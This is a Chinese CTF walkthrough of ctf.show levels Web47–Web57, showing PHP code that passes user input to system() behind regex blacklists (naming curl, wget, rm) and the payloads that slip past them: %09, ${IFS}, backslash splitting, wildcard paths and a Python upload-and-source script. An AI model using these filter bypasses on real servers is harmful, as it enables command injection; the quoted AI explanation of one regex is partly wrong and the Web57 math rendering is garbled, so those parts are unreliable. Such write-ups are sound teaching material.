<p>​		过滤了空格和星号，星号直接用问号绕过，空格使用 %09 绕过：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac<span class="comment">%09fla?.php|| #这里的%09不属于数字</span></span><br></pre></td></tr></table></figure>
<p>​		过滤了空格：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class="line">`<span class="comment">%09`(需要php环境)</span></span><br><span class="line">`<span class="built_in">$</span>&#123;IFS&#125;`</span><br><span class="line">`<span class="built_in">$</span>IFS<span class="built_in">$</span>9`</span><br><span class="line">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`<span class="comment">%20`</span></span><br><span class="line">`<span class="comment">%09</span></span><br></pre></td></tr></table></figure>
<h1 id="web47"><a class="markdownIt-Anchor" href="#web47">#</a> Web47：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		过滤了除了 tac 以外的很大一部分读取文件的操作，flag 也被过滤了，还有空格和星号，绕过方式和上一个一样：</p>
<blockquote>
<p>c=tac%09fla?.php||</p>
</blockquote>
<h1 id="web48"><a class="markdownIt-Anchor" href="#web48">#</a> Web48：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		不是，怎么多了这么多不认识的命令？</p>
<p>​		不过无所谓，发现还是老样子，tac、管道符和问号没有被过滤，直接无脑冲：</p>
<blockquote>
<p>c=tac%09fla?.php||</p>
</blockquote>
<h1 id="web49"><a class="markdownIt-Anchor" href="#web49">#</a> Web49：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		没有过滤 tac，但是过滤了百分号，不过这里无伤大雅，因为 %09 不会被当作 %，所以直接</p>
<blockquote>
<p>?c=tac%09fla?.php||</p>
</blockquote>
<h1 id="web50"><a class="markdownIt-Anchor" href="#web50">#</a> Web50：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		丸辣，过滤了 \x09，没法过了，那就使用 &lt;&gt; 来绕过，不过，&lt;&gt; 和通配符？一起使用的时候不回显，所以用反斜杠绕过关键字 flag：</p>
<blockquote>
<p>?c=tac&lt;&gt;fla\g.php||</p>
</blockquote>
<h1 id="web51"><a class="markdownIt-Anchor" href="#web51">#</a> Web51：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		靠，tac 被过滤了，不过无所谓，system 函数在某些时候可以用反斜杠来分割关键字，直接一把梭：</p>
<blockquote>
<p>?c=ta\c&lt;&gt;fla\g.php||</p>
</blockquote>
<h1 id="web52"><a class="markdownIt-Anchor" href="#web52">#</a> Web52：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		丸辣，这里过滤了大小于符号，不过，突然发现好像没有过滤掉 $ 符号，很好，直接 IFS 绕过。</p>
<blockquote>
<p>?c=ta\c${IFS}fla\g.php||</p>
<p>?c=ta\c${IFS}fl’'ag.php||</p>
</blockquote>
<p>​		不过没有找到 flag，flag 会在哪里呢？在根目录找到了 flag。</p>
<h1 id="web53"><a class="markdownIt-Anchor" href="#web53">#</a> Web53：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		没啥说的，IFS 绕过一把梭：</p>
<blockquote>
<p>?c=ta\c${IFS}fla\g.php</p>
</blockquote>
<h1 id="web54"><a class="markdownIt-Anchor" href="#web54">#</a> Web54：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		这又是啥正则？ai 的解释如下（部分正确，不可全信）：</p>
<blockquote>
<p>这行代码是使用 PHP 的 <code>preg_match</code>  函数来检查一个字符串（假设为变量 <code>$c</code> ）是否包含一系列特定的模式或字符。这些模式通常与尝试绕过安全限制、注入恶意代码或执行不期望的命令有关。下面是对这个正则表达式中各个部分的解释：</p>
<ol>
<li><code>\;</code> ：查找分号（ <code>;</code> ），这通常用于命令分隔，在某些情况下可能被用于尝试执行多条命令。</li>
<li><code>.*c.*a.*t.*</code> ：查找包含 <code>cat</code>  的字符串， <code>cat</code>  是一个常用于 Unix/Linux 系统中查看文件内容的命令。</li>
<li><code>.*f.*l.*a.*g.*</code> ：查找包含 <code>flag</code>  的字符串，这可能是在尝试获取某种 “标志” 或敏感信息。</li>
<li><code> [0-9]</code> ：查找空格后跟任何数字，这可能是在尝试绕过基于特定字符的限制。</li>
<li><code>\*</code> ：查找星号（ <code>*</code> ），在某些上下文中，它可能用于通配符匹配或具有特殊意义。</li>
<li><code>.*m.*o.*r.*e.*</code> 、 <code>.*w.*g.*e.*t.*</code> 、 <code>.*l.*e.*s.*s.*</code>  等：这些模式分别查找包含 <code>more</code> 、 <code>wget</code> 、 <code>less</code>  等命令的字符串，这些命令通常用于文件操作或数据传输。</li>
<li><code>.*h.*e.*a.*d.*</code> 、 <code>.*s.*o.*r.*t.*</code> 、 <code>.*t.*a.*i.*l.*</code>  等：查找包含 <code>head</code> 、 <code>sort</code> 、 <code>tail</code>  等 Unix/Linux 命令的字符串，这些命令用于处理文本数据。</li>
<li><code>.*s.*e.*d.*</code> 、 <code>.*c.*u.*t.*</code> 、 <code>.*t.*a.*c.*</code>  等：查找包含 <code>sed</code> 、 <code>cut</code> 、 <code>tac</code>  等命令的字符串，这些命令用于文本处理。</li>
<li><code>.*a.*w.*k.*</code> ：查找包含 <code>awk</code>  的字符串， <code>awk</code>  是一个强大的文本处理工具。</li>
<li><code>.*s.*t.*r.*i.*n.*g.*s.*</code> ：查找包含 <code>strings</code>  的字符串， <code>strings</code>  命令用于提取二进制文件中的可打印字符串。</li>
<li><code>.*o.*d.*</code> ：查找包含 <code>od</code>  的字符串， <code>od</code> （八进制转储）命令用于以八进制或其他格式转储文件内容。</li>
<li><code>.*c.*u.*r.*l.*</code> ：查找包含 <code>curl</code>  的字符串， <code>curl</code>  是一个用于传输数据的命令行工具。</li>
<li><code>.*n.*l.*</code> ：可能意图查找包含 <code>nl</code>  的字符串，但此模式较为宽泛，因为 <code>n</code>  和 <code>l</code>  是常见字母。</li>
<li><code>.*s.*c.*p.*</code> ：查找包含 <code>scp</code>  的字符串， <code>scp</code>  是安全复制命令，用于在本地和远程之间安全地传输文件。</li>
<li><code>.*r.*m.*</code> ：查找包含 <code>rm</code>  的字符串， <code>rm</code>  命令用于删除文件或目录。</li>
<li><code>\</code> 、 <code>%</code> 、 <code>\x09</code> 、 <code>\x26</code> 、 <code>&gt;</code> 、 <code>&lt;</code> ：查找反引号（```）、百分号（ <code>%</code> ）、制表符（ <code>\x09</code> ）、 <code>&amp;</code>  符号的 HTML 实体（ <code>\x26</code> ）、大于号（ <code>&gt;</code> ）、小于号（ <code>&lt;</code> ），这些字符或模式可能在尝试执行命令或注入代码时具有特殊意义。</li>
</ol>
<p>整个正则表达式使用了 <code>i</code>  修饰符，表示不区分大小写。如果 <code>preg_match</code>  返回 <code>false</code> （即没有找到匹配项），则意味着字符串 <code>$c</code>  不包含上述任何敏感模式或字符。这通常用于安全检查，以防止潜在的恶意输入。</p>
</blockquote>
<p>​		这里直接用下面这个方式绕：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=grep$&#123;IFS&#125;<span class="string">&#x27;&#123;&#x27;</span>$&#123;IFS&#125;fl???php</span><br><span class="line">（在 fl???php匹配到的文件中，查找含有&#123;的文件，并打印出包含 &#123; 的这一行）</span><br></pre></td></tr></table></figure>
<h1 id="web55"><a class="markdownIt-Anchor" href="#web55">#</a> Web55：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		终于到了新玩意儿了，无字母 RCE，有几种方法：<br>
查看源代码发现没有过滤数字，我们就想一想在我们查看文件的命令有没有数字开头的。<br>
匹配到 /bin 目录下的命令<br>
 cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64 等<br>
发现存在一个 base64<br>
 我们就可以通过通配符进行匹配命令执行查看 flag.php<br>
payload：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br><span class="line">意思是 /bin/base64 flag.php</span><br></pre></td></tr></table></figure>
<h1 id="web56"><a class="markdownIt-Anchor" href="#web56">#</a> Web56：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解题思路：过滤了分号，字母，数字等等符号</span><br><span class="line">本题没有过滤符号.(点)，因此可以想到linux中该符号.(点)的用法，与source命令用法相同：linxu中source命令和.(点)</span><br><span class="line">总体分析后，可以post上传一个php文件，内容为所需执行的linux指令，然后使用glob通配符和.(点)来将其中的内容以linux指令的形式来进行执行。</span><br></pre></td></tr></table></figure>
<p>​		还是 system，不过这次多过滤了字母。用下面这个脚本去跑，不过原理不是很清楚，贴一个链接，有条件就去学习一下。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnNpbmEuY29tLmNuL3MvYmxvZ19hZjY4YTJjMjAxMDE2bmgyLmh0bWw=">LINUX 中的点命令，或 source 命令，或点符号</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS1hZHZhbmNlZC5odG1s">无字母数字 webshell 之提高篇</span></p>
<p>​		python 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c7ab10d0-d6da-40f4-8e90-c56abda22ce1.challenge.ctf.show/&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;. /???/????????[@-[]&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;.\\a.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: file&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        r = requests.post(url,params=payload,files=files)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>, end=<span class="string">&#x27; &#x27;</span>,flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>​		另外还需要创建一个 a.txt 文件，里面的内容为 cat flag.php</p>
<h1 id="web57"><a class="markdownIt-Anchor" href="#web57">#</a> Web57：</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>​		这个似乎可以取反做：</p>
<blockquote>
<p>在 liunx 中，$(()) 为 0 , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext> </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak"> </span></span></span></span>(()))) 为 - 1 ~<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>代表取反，</mtext><mn>0</mn><mtext>取反后为</mtext><mo>−</mo><mn>1</mn><mtext>，这样就可以先构造出</mtext><mo>−</mo><mn>37</mn><mtext>，取反后就为</mtext><mn>36</mn><mtext>，也就是</mtext></mrow><annotation encoding="application/x-tex">代表取反，0取反后为-1，这样就可以先构造出-37，取反后就为36，也就是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">反</span><span class="mord cjk_fallback">，</span><span class="mord">0</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">反</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">为</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">构</span><span class="mord cjk_fallback">造</span><span class="mord cjk_fallback">出</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">7</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">反</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">为</span><span class="mord">3</span><span class="mord">6</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span></span></span></span> (()) 中有 37 个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext> </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak"> </span></span></span></span>(()))) 在加上取反，也就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext> </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak"> </span></span></span></span>(()))) 中有 37 个 - 1</p>
</blockquote>
<p>​		先贴一个无字母数字 RCE 的总结：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvODEwNz90aW1lX18xMzExPW40JTJCeG5EMERjN0dRRHREa1dHT0RsaGplMCUzRDZBZ2doaXJPTW93aUQ=">无字母数字 webshell 总结</span></p>
